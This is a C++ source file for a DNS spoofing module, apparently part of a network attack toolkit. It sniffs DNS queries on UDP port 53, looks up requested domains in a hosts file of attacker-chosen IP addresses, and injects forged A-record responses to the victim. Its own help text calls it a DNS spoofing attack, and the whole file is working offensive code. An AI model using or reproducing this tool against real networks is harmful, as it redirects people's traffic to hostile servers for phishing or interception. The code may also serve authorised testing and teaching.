#include "DnsSpoof.hh"

DnsSpoof::DnsSpoof(const NetworkInterface &iface, std::ostream *out, const std::string &file)
    : ASniffer(iface, "DnsSpoof", "udp and dst port 53", out)
{
    readHosts(file);
}

void DnsSpoof::readHosts(const std::string &file)
{
    std::ifstream   fs(file);
    std::string     host, ip;

    while (fs >> ip >> host)
        _spoofedHosts[host] = ip;
}

std::string DnsSpoof::info(void) const
{
    return "Hostfile = " + _file;
}

std::string DnsSpoof::help(void)
{
    std::string rep;

    rep += "Start DNS spoofing attack for domains in file.\n";
    rep += "Host file must have the form : ip_adress domain\n";
    rep += "\tOptions : <hostfile>";

    return rep;
}

bool DnsSpoof::handler(PDU &pdu)
{
    // EthernetII / IP / UDP / RawPDU
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

    // Is it a DNS query?
    if(dns.type() == DNS::QUERY)
    {
        std::map<std::string, std::string>::iterator  it;

        // Let's see if there's any query for an "A" record.
        for(const DNS::Query &query : dns.queries())
        {
            if(query.type() == DNS::A)
            {
                if ((it = _spoofedHosts.find(query.dname())) != _spoofedHosts.end())
                {
                    dns.add_answer(DNS::Resource(query.dname(), it->second, DNS::A, query.query_class(), 111));
                }
            }
        }

        // Have we added some answers?
        if(dns.answers_count() > 0)
        {
            // It's a response now
            dns.type(DNS::RESPONSE);
            // Recursion is available(just in case)
            dns.recursion_available(1);
            // Build our packet
            EthernetII pkt = EthernetII(eth.src_addr(), eth.dst_addr()) /
                                IP(ip.src_addr(), ip.dst_addr()) /
                                UDP(udp.sport(), udp.dport()) /
                                dns;
            // Send it!
            _sender.send(pkt, _iface);
        }
    }
    return true;
}
